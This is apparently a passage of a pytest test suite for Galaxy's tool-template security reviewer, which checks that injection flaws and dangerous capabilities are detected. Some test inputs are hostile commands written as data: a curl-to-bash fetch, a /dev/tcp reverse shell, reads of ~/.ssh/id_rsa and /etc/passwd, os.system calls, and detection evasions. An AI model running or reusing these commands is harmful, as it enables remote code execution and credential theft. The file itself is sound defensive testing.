"""The security review, on small tools written for one behaviour each."""

import os

import pytest

from galaxy.tool_util.parser.factory import get_tool_source
from galaxy.tool_util.security import (
    Report,
    review_tool_source,
)
from galaxy.tool_util.security.charsets import (
    DEFAULT_SANITIZED,
    PROBE,
    regex_anchored_start,
    regex_first,
    regex_removed,
    regex_universe,
    regex_word_first,
)
from galaxy.tool_util.security.template import (
    compile_template,
    CompileTimeExecution,
)
from galaxy.tool_util.security.validators import (
    ANY,
    expression_constraint,
)

INPUTS = """
<param name="input" type="data" format="txt"/>
<param name="flat" type="data_collection" collection_type="list"/>
<param name="nested" type="data_collection" collection_type="list:paired"/>
<param name="text" type="text"/>
<param name="word" type="text"><validator type="regex">^[A-Za-z0-9_]+$</validator></param>
<param name="prefix_only" type="text"><validator type="regex">^[A-Za-z0-9_]+</validator></param>
<param name="free" type="text"><sanitizer sanitize="false"/></param>
<param name="no_quote" type="text">
  <sanitizer><valid initial="string.printable"><remove value="&apos;"/></valid></sanitizer>
</param>
<param name="letters" type="text">
  <sanitizer><valid initial="string.ascii_letters"><add value="_"/></valid></sanitizer>
</param>
<param name="no_dash" type="text"><validator type="regex">^[^-].*$</validator></param>
<param name="words" type="text"><validator type="regex">^[A-Za-z0-9_ ]+$</validator></param>
<param name="expr_no_quote" type="text">
  <sanitizer sanitize="false"/><validator type="expression">"'" not in value</validator>
</param>
<param name="expr_alnum" type="text">
  <sanitizer sanitize="false"/><validator type="expression">not value or value.replace(':', '').isalnum()</validator>
</param>
<param name="expr_unknown" type="text">
  <sanitizer sanitize="false"/><validator type="expression">len(value) &lt; 10</validator>
</param>
<param name="dash_words" type="text">
  <validator type="regex">^[A-Za-z0-9_][A-Za-z0-9_-]*( [A-Za-z0-9_][A-Za-z0-9_-]*)*$</validator>
</param>
<param name="dash_anywhere" type="text"><validator type="regex">^[A-Za-z0-9_ -]*$</validator></param>
<param name="sq" type="text">
  <sanitizer><valid initial="string.printable"><remove value="&apos;"/></valid>
  <mapping initial="none"><add source="&apos;" target="&apos;&quot;&apos;&quot;&apos;"/></mapping></sanitizer>
</param>
<param name="no_dq" type="text">
  <sanitizer sanitize="false"/><validator type="regex">^[^"$`]*$</validator>
</param>
<param name="no_expansion" type="text">
  <sanitizer sanitize="false"/><validator type="regex">^[^\\\\$`]*$</validator>
</param>
<section name="opts" title="opts">
  <conditional name="adv">
    <param name="on" type="select"><option value="y">y</option><option value="n">n</option></param>
    <when value="y"><param name="deep" type="data" format="txt"/></when>
    <when value="n"/>
  </conditional>
</section>
<param name="choice" type="select"><option value="a">A</option><option value="b c">B</option></param>
<param name="column" type="data_column" data_ref="input" multiple="true"/>
<param name="secret" type="hidden" value="x"/>
<param name="count" type="integer" value="1"/>
<repeat name="rows" title="rows"><param name="label" type="text"/></repeat>
<conditional name="mode">
  <param name="kind" type="select"><option value="x">x</option><option value="y">y</option></param>
  <when value="x"><param name="value" type="text"/></when>
  <when value="y"><param name="value" type="integer" value="1"/></when>
</conditional>
"""


def review(tmp_path, command: str, configfiles: str = "", extra: str = "", tool_attrs: str = "") -> Report:
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(f"""<tool id="t" name="t" version="1" profile="24.2" {tool_attrs}>
  <command><![CDATA[{command}]]></command>
  <configfiles>{configfiles}</configfiles>
  <inputs>{INPUTS}</inputs>
  <outputs><data name="out" format="txt"/></outputs>
  {extra}
</tool>""")
    return review_tool_source(get_tool_source(path))


def rules(report: Report, kind: str = "vulnerability") -> set[tuple[str, str]]:
    return {(f.rule, f.severity) for f in report.findings if f.kind == kind}


@pytest.mark.parametrize(
    "command",
    [
        "tool '$text' \"$text\" '$word' $word '$letters' $letters $count '$choice' '$input' > '$out'",
        # The sanitizer keeps everything but the single quote, and the value sits inside single quotes.
        "tool '$no_quote'",
        # Dataset names go through Galaxy's default sanitizer.
        "tool --title '$input.name' --ext $input.ext",
        # Cleaning with a class that keeps whitespace is enough inside quotes.
        "#import re\n#set $name = re.sub('[^\\s\\w\\-]', '_', str($input.element_identifier))\nln -s '$input' '${name}.txt'",
        "ln -s '$input' '${input.safe_element_identifier}.txt'",
        # A #def that cleans its argument.
        "#import re\n#def clean($v)\n#return re.sub('[^\\w.-]', '_', str($v))\n#end def\ntool '$clean($input.element_identifier)'",
        # shlex.quote makes a value safe as an unquoted word.
        "#import shlex\ntool ${shlex.quote(str($input.element_identifier))}",
        # Each cleaned name gets its own quotes from the separator.
        (
            "#import re\n#set $names = \"' '\".join([re.sub('[^\\w]', '_', str($f.element_identifier)) for $f in $flat])\n"
            "tool -names '$names'"
        ),
        # A commented-out line is not a command.
        "tool ## $text\n",
        "tool '$mode.kind' \\$GALAXY_SLOTS \"\\${TMPDIR:-.}\"",
    ],
)
def test_contained_values_are_not_reported(tmp_path, command):
    # A quoted value may still begin with a dash; that is reported separately, at low severity.
    assert {rule for rule in rules(review(tmp_path, command)) if rule != ("option-injection", "low")} == set()


@pytest.mark.parametrize(
    "command,reported",
    [
        ("tool '$input' '$text'", True),
        ("tool --name '$text'", False),
        ("tool -- '$text'", False),
        ("tool '$letters'", False),
    ],
)
def test_value_that_can_start_with_a_dash(tmp_path, command, reported):
    assert (("option-injection", "low") in rules(review(tmp_path, command))) is reported


def test_sanitizer_that_writes_a_shell_safe_quote(tmp_path):
    escaping = (
        '<inputs><param name="q" type="text"><sanitizer><valid initial="string.printable">'
        '<remove value="&apos;"/></valid><mapping initial="none"><add source="&apos;" target="&apos;&quot;&apos;&quot;&apos;"/>'
        "</mapping></sanitizer></param></inputs>"
    )
    path = os.path.join(tmp_path, "escaping.xml")
    for command, expected in [("tool --q '$q'", set()), ('tool --q "$q"', {("shell-injection", "high")})]:
        with open(path, "w") as fh:
            fh.write(
                f'<tool id="e" name="e" version="1" profile="24.2"><command><![CDATA[{command}]]></command>{escaping}</tool>'
            )
        assert rules(review_tool_source(get_tool_source(path))) == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("ln -s '$input' '$input.element_identifier'", ("shell-injection", "high")),
        ('echo "$nested.name"', ("shell-injection", "high")),
        ("#for $pair in $nested\ncp '$pair.forward' 'out/${pair.name}'\n#end for", ("shell-injection", "high")),
        ('#for $k in $flat.keys()\ntool "$k"\n#end for', ("shell-injection", "high")),
        ("tool $text", ("argument-injection", "medium")),
        ("tool '$free'", ("shell-injection", "high")),
        ('tool "$no_quote"', ("shell-injection", "high")),
        # .value and string methods return the submitted value, not the sanitized one.
        ("tool '$text.value'", ("shell-injection", "high")),
        ("tool '${text.strip()}'", ("shell-injection", "high")),
        ("#set $alias = $text.value\ntool '$alias'", ("shell-injection", "high")),
        # A regex validator without a final $ does not restrict the tail of the value.
        ("tool '$prefix_only.value'", ("shell-injection", "high")),
        # Iterating a multiple column parameter yields raw values; they are only free on an empty dataset.
        ("#for $c in $column\ntool '$c'\n#end for", ("shell-injection", "medium")),
        # A hidden parameter is whatever the client submits.
        ("tool $secret", ("argument-injection", "medium")),
        ("$text --version", ("command-position", "high")),
        ('sh -c "tool $text"', ("nested-interpreter", "medium")),
        ("awk '$1 == \"$no_quote\"' '$input'", ("nested-interpreter", "high")),
        ("python -c 'print($text)'", ("nested-interpreter", "high")),
        # Text in both branches of the conditional is one name: the text branch decides.
        ("tool $mode.value", ("argument-injection", "medium")),
        # The default sanitizer keeps '/', so a quoted value still picks its own path.
        ("tool '$input' > '$text'", ("path-traversal", "medium")),
        # The repr of a Python list brings its own quotes into the single-quoted word.
        (
            "#set $labels = [str($r.label.value) for $r in $rows]\ntool '--labels=${labels}'",
            ("shell-injection", "high"),
        ),
        # A command assembled in a Python string is lexed like template text.
        (
            "#set $cmd = \"ln -s '%s' '%s' &&\" % ($input, $input.element_identifier)\n$cmd true",
            ("shell-injection", "high"),
        ),
        # Either branch of an #if can leave the quote open.
        ("tool #if $count\n'\n#else\n\"\n#end if\n$no_quote", ("shell-injection", "high")),
    ],
)
def test_escaping_values_are_reported(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command))


def test_value_reaching_python_that_runs_on_the_server(tmp_path):
    command = "#import subprocess\n#set $first = subprocess.check_output('head -n1 ' + str($text), shell=True)\ntool"
    assert ("server-injection", "critical") in rules(review(tmp_path, command))
    assert ("server-injection", "high") in rules(review(tmp_path, "tool ${open(str($text)).read()}"))


def test_file_read_by_the_template_is_user_data(tmp_path):
    # The content of a dataset is the user's, wherever the template got the path from.
    assert ("shell-injection", "high") in rules(review(tmp_path, "tool ${open(str($input)).readline()}"))
    command = "#set $ids = [x.split('\\t')[0] for x in open(str($input)).readlines()]\n#for $f in $ids\nfetch '$f' &&\n#end for\ntrue"
    assert ("shell-injection", "high") in rules(review(tmp_path, command))
    own = "#import os\ntool ${open(os.path.join($__tool_directory__, 'defaults.txt')).read()}"
    assert rules(review(tmp_path, own)) == set()


@pytest.mark.parametrize(
    "command,expected",
    [
        ("tool '$expr_no_quote'", None),
        ("tool $expr_no_quote", ("shell-injection", "high")),
        ("tool $expr_alnum", None),
        # An expression that is not understood constrains nothing.
        ("tool '$expr_unknown'", ("shell-injection", "high")),
        # Only spaces get through, and no word can be an option: a list of plain words.
        ("tool --names $words", ("argument-injection", "low")),
        ("tool --names $text", ("argument-injection", "medium")),
    ],
)
def test_validators_narrow_the_value(tmp_path, command, expected):
    found = {rule for rule in rules(review(tmp_path, command)) if rule[0] != "option-injection"}
    assert found == ({expected} if expected else set())


@pytest.mark.parametrize(
    "command,reported",
    [
        ("tool '$input' '$no_dash'", False),
        (
            "#import re\n#set $n = re.sub('^-', '_', re.sub('[^\\w.-]', '_', str($input.element_identifier)))\ntool '$n'",
            False,
        ),
        ("#import re\n#set $n = re.sub('^-|[^\\w.-]', '_', str($input.element_identifier))\ntool '$n'", False),
        ("#import re\n#set $n = re.sub('[^\\w.-]', '_', str($input.element_identifier))\ntool '$n'", True),
        # Deleting one leading dash leaves the second one of `--option`.
        (
            "#import re\n#set $n = re.sub('^-', '', re.sub('[^\\w.-]', '_', str($input.element_identifier)))\ntool '$n'",
            True,
        ),
        ("#set $n = str($text).lstrip('-')\ntool '$n'", False),
    ],
)
def test_leading_dash_removed_by_validator_or_cleaning(tmp_path, command, reported):
    assert (("option-injection", "low") in rules(review(tmp_path, command))) is reported


def test_combined_cleaning_pattern_is_cleaning(tmp_path):
    command = "#import re\n#set $n = re.sub('^-|[^\\w.-]', '_', str($input.element_identifier))\ntool '$n' $n"
    assert rules(review(tmp_path, command)) == set()


def test_double_quote_escaped_in_the_template(tmp_path):
    escaped = """#set $t = $%s.replace('"', '\\\\"')\ntool "$t\""""
    # Sound only when the value cannot bring a backslash, a dollar or a backtick of its own.
    assert rules(review(tmp_path, escaped % "no_expansion")) <= {("option-injection", "low")}
    assert ("shell-injection", "high") in rules(review(tmp_path, escaped % "free"))


def test_strings_collected_in_a_list_keep_their_quotes(tmp_path):
    # The literal '"' closes the single quotes of echo: the value is inside double quotes, not single ones.
    command = (
        "#set $a = []\n#silent $a.append('x=1')\n#if $no_quote\n"
        """#silent $a.append("t='\\"'" + str($no_quote) + "'\\"'")\n#end if\n"""
        """echo 'get(${",".join($a)})' | tool"""
    )
    assert ("shell-injection", "high") in rules(review(tmp_path, command))
    quoted = "#set $a = []\n#silent $a.append(\"--x '\" + str($text) + \"'\")\ntool ${' '.join($a)}"
    assert {rule for rule in rules(review(tmp_path, quoted)) if rule[0] != "option-injection"} == set()


def test_parameter_named_without_its_conditional(tmp_path):
    report = review(tmp_path, "ln -s '$opts.deep' '$opts.deep.element_identifier'")
    assert ("shell-injection", "high") in rules(report)


def test_file_given_to_awk_is_data_unless_it_is_the_program(tmp_path):
    content = CONFIG.format('<![CDATA[{ print "$text" }]]>')
    assert not any(
        rule == "configfile-injection" and severity != "low"
        for rule, severity in rules(review(tmp_path, "awk '{ print }' '$script'", content))
    )
    assert not any(
        rule == "configfile-injection" and severity != "low"
        for rule, severity in rules(review(tmp_path, "awk '{ print }' < '$script'", content))
    )
    program = CONFIG.format("<![CDATA[{ print $free }]]>")
    assert ("configfile-injection", "high") in rules(review(tmp_path, "awk -f '$script' '$input'", program))


def test_options_sanitize_false_removes_all_sanitization(tmp_path):
    report = review(tmp_path, "tool '$text' '$input.name'", extra='<options sanitize="false"/>')
    assert {f.source for f in report.findings if f.rule == "shell-injection"} == {
        "text param 'text'",
        "name of dataset 'input'",
    }


def test_python_built_command_keeps_quoting(tmp_path):
    command = "#set $cmd = \"ln -s '%s' '%s.txt' &&\" % ($input, $letters)\n$cmd true"
    assert rules(review(tmp_path, command)) == set()


CONFIG = '<configfile name="script">{}</configfile>'
FIVE_HELPERS_DEEP = "".join(
    f"#def {name}($v)\n${inner}#slurp\n#end def\n"
    for name, inner in [("a", "b($v)"), ("b", "c($v)"), ("c", "d($v)"), ("d", "e($v)"), ("e", "v")]
)


@pytest.mark.parametrize(
    "command,content,expected",
    [
        # Galaxy's default sanitizer keeps ( ) , and letters: enough to call a function in R or Python.
        ("Rscript '$script'", "x <- $text", {("configfile-injection", "high")}),
        ("python '$script'", "x = '$text.value'", {("configfile-injection", "high")}),
        ("python '$script'", "x = '$text'", set()),
        ("python '$script'", "x = $count\ny = '$letters'", set()),
        # A Python list written into Python code is a correct literal.
        ("python '$script'", "#set $labels = [str($r.label) for $r in $rows]\nlabels = $labels", set()),
        # json.dumps escapes for JSON.
        (
            "tool --config '$script'",
            "#import json\n#echo json.dumps([str($f.element_identifier) for $f in $flat])",
            set(),
        ),
        # The configfile is an argument of a Python program, not the program: a data file.
        ("python '$__tool_directory__/run.py' '$script'", "name = $text", set()),
        ("tool --config '$script'", 'name = "$input.element_identifier"', {("configfile-injection", "low")}),
    ],
)
def test_configfiles(tmp_path, command, content, expected):
    assert rules(review(tmp_path, command, CONFIG.format(f"<![CDATA[{content}]]>"))) == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("#import os\n#silent os.system('id')\ntool", ("template-exec", "critical")),
        ("#set $key = os.environ['SECRET']\ntool", ("template-env", "high")),
        ("#import subprocess\ntool", ("template-exec", "critical")),
        ("tool ${__import__('os').getcwd()}", ("template-exec", "critical")),
        ("tool ${open('/etc/passwd').read()}", ("template-file-io", "high")),
        ("tool $__app__.config.database_connection", ("template-app-access", "high")),
        ("tool ${''.__class__.__mro__}", ("template-reflection", "high")),
        ("tool $input.unsanitized.history.user.email", ("template-model-access", "medium")),
        ("#include '/etc/passwd'\ntool", ("template-include", "high")),
        ("curl -s http://example.org/x.sh | bash", ("capability-pipe-to-shell", "high")),
        ("cat ~/.ssh/id_rsa > '$out'", ("capability-sensitive-path", "high")),
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ("capability-reverse-shell", "high")),
        ("wget -O x 'http://example.org/data'", ("capability-network", "low")),
    ],
)
def test_capabilities(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command), kind="capability")


@pytest.mark.parametrize(
    "command",
    [
        # os.path only computes; a loop variable may be called like a builtin.
        "#import os\n#import re\n#import json\ntool '${os.path.basename(str($input))}'",
        "#for $file in $flat\ntool '$file' '$file.ext'\n#end for",
        "tool '$__tool_directory__/x.py' '$__user_email__'",
    ],
)
def test_ordinary_templates_have_no_capability_findings(tmp_path, command):
    assert rules(review(tmp_path, command), kind="capability") == set()


def test_tool_declarations(tmp_path):
    report = review(
        tmp_path,
        "tool",
        extra="""<code file="hooks.py"/>
<environment_variables><environment_variable name="KEY" inject="api_key"/></environment_variables>""",
    )
    assert {("tool-code-file", "high"), ("capability-api-key", "high")} <= rules(report, kind="capability")


@pytest.mark.parametrize(
    "directive",
    [
        "#compiler-settings python\nimport os\nos.system('touch {marker}')\n#end compiler-settings\n",
        "#compiler commentStartToken = __import__('os').system('touch {marker}') or '//'\n",
    ],
)
def test_compile_time_directives_are_refused_not_run(tmp_path, directive):
    marker = os.path.join(tmp_path, "ran")
    report = review(tmp_path, directive.format(marker=marker) + "tool '$input.element_identifier'")
    assert not os.path.exists(marker)
    assert ("template-compile-exec", "critical") in rules(report, kind="capability")
    with pytest.raises(CompileTimeExecution):
        compile_template(directive.format(marker=marker))


def test_module_level_code_is_not_run(tmp_path):
    marker = os.path.join(tmp_path, "ran")
    compile_template(f"#import os\n#attr x = os.system('touch {marker}')\n#silent os.system('touch {marker}')\n")
    assert not os.path.exists(marker)


def test_repeated_use_is_one_finding_with_all_lines(tmp_path):
    report = review(tmp_path, "tool $text\n&& tool $text\n&& tool $text")
    (finding,) = report.findings
    assert (finding.line, finding.more_lines) == (1, (2, 3))


def test_charsets():
    assert DEFAULT_SANITIZED == frozenset(" -=_.()/+*^,:?!")
    assert "-" not in regex_word_first(r"^\w+( \w[\w-]*)*$")
    assert "-" in regex_word_first(r"^[\w -]*$")
    # A lookahead inside an optional or repeated part does not apply when that part matches nothing.
    assert "-" in regex_word_first(r"^\w+(?: (?:(?!-)\w?)*[\w-]+)*$")
    assert regex_anchored_start(r"^a|^b") and regex_anchored_start(r"\Aa")
    assert not regex_anchored_start(r"^a$|b$") and not regex_anchored_start(r"(?m)^a")
    assert regex_universe(r"(?m)^[a-z]+$") == PROBE
    # A negative lookahead after the space keeps a dash from starting a word.
    assert "-" not in regex_word_first(r"(?!-)(?:[\w.:+-]| (?!-))+$")
    # `$` also matches before a newline that ends the value; `\Z` does not.
    assert regex_universe(r"^[\w .:-]+$") == frozenset(" .:-_\n")
    assert regex_universe(r"^[\w .:-]+\Z") == frozenset(" .:-_")
    assert regex_universe(r"^[a-z]+") == PROBE
    assert regex_universe(r"^[^']*$") == PROBE - {"'"}
    assert regex_removed(r"[^\w.-]") == (PROBE - frozenset("_.-"), frozenset(), False)
    assert regex_removed(r"^-|[^\w.-]") == (PROBE - frozenset("_.-"), frozenset("-"), False)
    assert regex_removed("^-+") == (frozenset(), frozenset("-"), True)
    assert regex_removed("ab") is None
    assert "-" not in regex_first(r"^[^-].*$")
    assert regex_first(r"^(?!-)[\w -]+$") == frozenset(" _")
    # Nothing is required at the start of the value.
    assert regex_first(r"[a-z]*") == PROBE
    assert expression_constraint('"\'" not in value').chars == PROBE - {"'"}
    assert expression_constraint("value.isalnum()").chars == frozenset()
    assert expression_constraint("not value.startswith('-')").lead == PROBE - {"-"}
    assert expression_constraint("all(c not in value for c in ';|&')").chars == PROBE - frozenset(";|&")
    assert expression_constraint("value.isalnum() or len(value) > 3") == ANY
    assert expression_constraint("not (value.isalnum() and value)") == ANY
    assert expression_constraint("__import__('os').system('id')") == ANY


@pytest.mark.parametrize(
    "command,expected",
    [
        # A helper that returns its argument is a function: the result is written, not what the helper wrote.
        ("#def ident($v)\n#return $v\n#end def\ntool '$ident($input.element_identifier)'", ("shell-injection", "high")),
        ("#def show($v)\n$v#slurp\n#end def\ntool '$show(v=$text.value)'", ("shell-injection", "high")),
        ("tool '${\"{v}\".format(v=$text.value)}'", ("shell-injection", "high")),
        # In $'...' a backslash escapes the quote, so the middle word is not quoted at all.
        ("tool $'\\'' $no_quote $'\\''", ("shell-injection", "high")),
        ("find . -exec sh -c 'tool \"$1\" $no_quote' _ {} \\;", ("nested-interpreter", "high")),
        # Only the first quote is removed.
        ('tool \'${text.value.replace("\'", "", 1)}\'', ("shell-injection", "high")),
        ('#import re\ntool \'${re.sub("\'", "", $text.value, 1)}\'', ("shell-injection", "high")),
        ("#set $f = lambda: $text.value\ntool '${f()}'", ("shell-injection", "high")),
        # Decoding turns letters and digits into anything.
        ("#import base64\ntool '${base64.b64decode(str($word.value)).decode()}'", ("shell-injection", "high")),
        ("echo 'x\n#capture v\n$no_quote\n#end capture\n' && tool $v", ("shell-injection", "high")),
        (FIVE_HELPERS_DEEP + "tool '$a($text.value)'", ("shell-injection", "high")),
    ],
)
def test_escaping_values_found_by_review(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command))


def test_script_read_from_standard_input_is_a_program(tmp_path):
    report = review(tmp_path, "R --vanilla < '$script'", CONFIG.format("<![CDATA[x = $text]]>"))
    assert ("configfile-injection", "high") in rules(report)


@pytest.mark.parametrize(
    "command,expected",
    [
        ("#from os import system\n#silent $system('id')\ntool", ("template-exec", "critical")),
        ("#import os as o\n#silent o.system('id')\ntool", ("template-exec", "critical")),
        ("#set $o = $os\n#silent $o.system('id')\ntool", ("template-reflection", "high")),
        # The assignment never runs, so `$eval` is still the builtin.
        ("#if False\n#set $eval = 1\n#end if\ntool ${eval('1')}", ("template-exec", "critical")),
        ("tool ${getVar('__app__').config.database_connection}", ("template-app-access", "high")),
        ("tool ${getVar('__ap' + 'p__')}", ("template-reflection", "medium")),
        ("tool $os.system('id')", ("template-exec", "critical")),
        ("#def f($x=__import__('os').system('id'))\n#end def\ntool", ("template-exec", "critical")),
        ("#import operator\ntool ${operator.methodcaller('system', 'id')}", ("template-reflection", "high")),
    ],
)
def test_capability_evasions_found_by_review(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command), kind="capability")


def test_capture_is_not_a_capability(tmp_path):
    report = review(tmp_path, "#capture v\n$count\n#end capture\ntool '$v'")
    assert rules(report, kind="capability") == set()


@pytest.mark.parametrize(
    "template",
    [
        "#i18n x=__import__('os').system('touch {marker}')\nhi\n#end i18n\n",
        '#encoding utf-7\n+ACc- if __import__("os").system("touch {marker}") else +ACc-\n',
    ],
)
def test_macro_and_encoding_directives_are_refused_not_run(tmp_path, template):
    marker = os.path.join(tmp_path, "ran")
    report = review(tmp_path, template.format(marker=marker))
    assert not os.path.exists(marker)
    assert ("template-compile-exec", "critical") in rules(report, kind="capability")


def test_utf8_encoding_directive_is_allowed(tmp_path):
    report = review(tmp_path, "#encoding utf-8\ntool '$input.element_identifier'")
    assert ("shell-injection", "high") in rules(report)


def test_template_built_to_explode_is_cut_off(tmp_path):
    helpers = "".join(f"#def h{i}($v)\n" + f"$h{i + 1}($v)" * 60 + "\n#end def\n" for i in range(5))
    report = review(tmp_path, helpers + "#def h5($v)\n$v\n#end def\ntool $h0($text)")
    assert any("too expensive" in note for note in report.unanalyzed)


CLEANED_LIST = "#import re\n#set $l = [re.sub('[^\\w.-]', '_', str($f.element_identifier)) for $f in $flat]\n"


@pytest.mark.parametrize(
    "command,expected",
    [
        # A Python list is written as ['a', 'b']: its quotes leave the cleaned names outside the shell quotes.
        (CLEANED_LIST + "tool '--names=$l'", set()),
        (
            (
                "#import re\n#set $l = [re.sub('[^\\w ]', '_', str($f.element_identifier)) for $f in $flat]\n"
                "tool '--names=$l'"
            ),
            {("argument-injection", "low")},
        ),
        ("#set $l = [str($f.element_identifier) for $f in $flat]\ntool '--names=$l'", {("shell-injection", "high")}),
        # list.reverse() returns None, which Cheetah does not write.
        ("#set $l = [str($f.element_identifier) for $f in $flat]\ntool $l.reverse()", set()),
        ("#import json\n" + CLEANED_LIST + "tool '${json.dumps($l)}'", set()),
        ("#import base64\ntool ${base64.b64encode(str($free).encode()).decode()}", set()),
        ("#set $s = str($free)\n#set $n = $s - 1\ntool $n", set()),
        # A parameter wrapper or a pathlib.Path may define the operator for text.
        ("#import pathlib\n#set $p = pathlib.Path('/tmp') / str($free)\ntool $p", {("shell-injection", "high")}),
        (
            "#import base64\ntool ${base64.encodebytes(str($free).encode()).decode()}",
            {("argument-injection", "medium")},
        ),
    ],
)
def test_values_built_in_python(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        # Each word must begin with a letter, digit or underscore: the extra words cannot be options.
        ("tool $dash_words", {("argument-injection", "low")}),
        ("tool $dash_anywhere", {("argument-injection", "medium")}),
    ],
)
def test_words_that_cannot_begin_with_a_dash(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("tool '$sq'", set()),
        # Joined with a value no user controls, the escaping still holds.
        ("#set $x = $sq if $count else 'none'\ntool '$x'", set()),
        ("tool '${str($sq).strip()}'", set()),
        # Removing the double quotes of '"'"' breaks the escaping.
        ("tool '${str($sq).replace('\"', '')}'", {("shell-injection", "high")}),
    ],
)
def test_escaped_single_quote_survives_joins_and_methods(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        (
            (
                "#import re\n#set $n = str($input.element_identifier)\n"
                "#if re.match('^[\\w.-]+$', $n)\nln -s '$input' '$n'\n#end if"
            ),
            set(),
        ),
        # re.search without ^ finds the pattern anywhere: the value is not narrowed.
        (
            (
                "#import re\n#set $n = str($input.element_identifier)\n"
                "#if re.search('[\\w.-]+$', $n)\nln -s '$input' '$n'\n#end if"
            ),
            {("shell-injection", "high")},
        ),
        (
            (
                "#import re\n#if str($input.element_identifier) != re.sub('[^\\w.-]', '_', str($input.element_identifier))\n"
                "exit 1\n#else\nln -s '$input' '$input.element_identifier'\n#end if"
            ),
            set(),
        ),
        # The skipped iterations never reach the command; after the loop nothing is narrowed.
        (
            (
                "#import re\n#for $f in $flat\n#if not re.fullmatch('[\\w.]+', str($f.element_identifier))\n#continue\n"
                "#end if\ntool '$f.element_identifier'\n#end for"
            ),
            set(),
        ),
        (
            (
                "#import re\n#for $f in $flat\n#if not re.fullmatch('[\\w.]+', str($f.element_identifier))\n#continue\n"
                "#end if\n#end for\ntool '$f.element_identifier'"
            ),
            {("shell-injection", "high")},
        ),
        ("#if str($text) in ['a', 'b']\ntool $text\n#end if", set()),
        # int() stops the rendering for anything that is not a number.
        ("#if int(str($text)) > 0\ntool $text\n#end if", set()),
        ("#set $n = int(str($text))\ntool $text", set()),
        # ...but not when it may not run.
        ("#set $n = int(str($text)) if $count else 0\ntool $text", {("argument-injection", "medium")}),
    ],
)
def test_tests_narrow_the_value(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        # In <when value="y"> the parameter `value` is an integer.
        ("#if $mode.kind == 'y'\ntool $mode.value\n#end if", set()),
        ("#if str($mode.kind) != 'x'\ntool $mode.value\n#end if", set()),
        ("#if $mode.kind == 'x'\ntool $mode.value\n#end if", {("argument-injection", "medium")}),
        ("tool $mode.value", {("argument-injection", "medium")}),
    ],
)
def test_conditional_selector_picks_the_when_block(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        # What a test shows about `$text` is about the sanitized text, not about its raw value.
        ("#import re\n#if re.match('^\\w+$', str($text))\ntool ${text.value}\n#end if", ("shell-injection", "high")),
        ("#import re\n#if re.match('^\\w+$', str($text))\ntool ${text.lower()}\n#end if", ("shell-injection", "high")),
        ("#if $text == 'X'\ntool ${text.value}\n#end if", ("shell-injection", "high")),
        (
            "#import re\n#set $p = $free\n#if re.match('^\\w+$', str($p))\ntool ${p.value}\n#end if",
            ("shell-injection", "high"),
        ),
        # Only the first alternative is anchored; MULTILINE lets ^ and $ match at any line.
        ("#import re\n#if re.search('^a$|b$', str($free))\ntool $free\n#end if", ("shell-injection", "high")),
        ("#import re\n#if re.match('(?m)[a-z]+$', str($free))\ntool '$free'\n#end if", ("shell-injection", "high")),
        ("#import re\n#if re.match('[a-z]+(?m:$)', str($free))\ntool '$free'\n#end if", ("shell-injection", "high")),
        # A #raise inside #try may be caught; a conversion in a handler or a chained compare may not run.
        (
            (
                "#import re\n#try\n#if not re.match('^\\w+$', str($free))\n#raise ValueError\n#end if\n"
                "#except\n#pass\n#end try\ntool $free"
            ),
            ("shell-injection", "high"),
        ),
        ("#try\n#pass\n#except\n#silent int($free)\n#end try\ntool '$free'", ("shell-injection", "high")),
        ("#if 5 < int($count) < int($free)\n#pass\n#end if\ntool '$free'", ("shell-injection", "high")),
        # A loop body may run zero times or leave early.
        ("#set $s = str($free)\n#for $r in $rows\n#silent int($s)\n#end for\ntool '$s'", ("shell-injection", "high")),
        (
            (
                "#import re\n#set $s = str($free)\n#for $r in $rows\n#if not re.match('^\\w+$', $s)\n#continue\n"
                "#end if\n#end for\ntool $s"
            ),
            ("shell-injection", "high"),
        ),
        (
            (
                "#import re\n#set $s = str($free)\n#for $r in $rows\n#if not re.match('^\\w+$', $s)\n#break\n"
                "#end if\n#end for\ntool $s"
            ),
            ("shell-injection", "high"),
        ),
        ("#set $s = str($free)\n#for $r in $rows\n#set $s = 'safe'\n#end for\ntool $s", ("shell-injection", "high")),
        (
            "#set global $g = $word\n#if $g == 'x'\n#set global $g = $free\ntool $g\n#end if",
            ("shell-injection", "high"),
        ),
        # The replacement itself stays in the value.
        (
            "#import re\n#if str($free) == re.sub('[^\\w]', ';', str($free))\ntool $free\n#end if",
            ("shell-injection", "high"),
        ),
        # shlex.quote leaves `,` unquoted; a quote in literal text no longer lines up with the escaping.
        ("#import shlex\ntool ${shlex.quote(str($free)).replace(',', ';')}", ("shell-injection", "high")),
        ("#import shlex\ntool ${''.join([\"'\", shlex.quote(str($free))])}", ("shell-injection", "high")),
    ],
)
def test_narrowing_does_not_hide_raw_values(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command,content,expected",
    [
        # One value that can end in a backslash breaks the string syntax only.
        ("python '$script'", "adata.obs['$no_quote'] = 1", {("configfile-injection", "low")}),
        # A second value on the line: the first escapes its closing quote, the second is Python code.
        (
            "python '$script'",
            "adata.obs['$no_quote'] = adata.obs['$no_quote']",
            {("configfile-injection", "low"), ("configfile-injection", "high")},
        ),
    ],
)
def test_value_after_an_escaped_closing_quote_in_a_script(tmp_path, command, content, expected):
    assert rules(review(tmp_path, command, CONFIG.format(f"<![CDATA[{content}]]>"))) == expected


def test_backslash_inside_sh_single_quotes_escapes_nothing(tmp_path):
